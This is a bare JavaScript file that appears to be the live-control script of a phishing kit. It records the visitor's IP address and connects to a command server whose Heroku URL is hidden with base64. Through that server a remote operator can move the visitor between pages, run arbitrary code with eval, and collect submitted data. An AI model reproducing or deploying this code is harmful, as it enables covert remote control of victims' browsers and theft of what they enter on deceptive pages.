 var ipdata;
  var orgect=false;
            $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
             ipdata=data['ipAddress'];
});
            let roomid = (Math.random() + 1).toString(36).substring(2);
            console.log(roomid);
            
         var host=atob('aHR0cHM6Ly9kYW1wLXRlbXBsZS0zMzMyMi5oZXJva3VhcHAuY29tLw==');
            var socket = io(host);
            socket.on("connect", function () {
                console.log("Connected to socket");
            });
            socket.on("disconnect", function () {
                console.log("Disconnected from socket");
                socket.emit("userjoin", { room: roomid, sta: "offline" });
            });
            socket.on("AdminPageconnect", function (data) {
                var result = getpage(page);
                console.log(result);
                socket.emit("Pageconnect", pages);
                socket.emit("CurrentPage", result);
            });
            socket.on('disconnect', reason => {
            console.log(`reason: ${reason}`);
});
            socket.on("UserGotoPage", function (data) {
                console.log(data);
                var page = data.page;
                input = data.input;
                var result = getpage(page);
                socket.emit("CurrentPage", result);
                console.log(result.goto);
                eval(result.goto);
                return false;
            });
             window.onbeforeunload = function () {
                socket.emit("userjoin", { room: roomid, sta: "offline" });
                socket.emit("stop");
                socket.disconnect();
            };
 function Orgconnect(){
                socket.emit("Orgconnect", { orgid: orgid, room: roomid , livepage: livepage, ip: ipdata  });
                 orgect=true;
            }
            function getpage(page) {
                var result = pages.find((obj) => {
                    return obj.page === page;
                });
                return result;
                console.log(result);
            }
            function sendrdata(data){    
        socket.emit("Resultconnect", data);
            }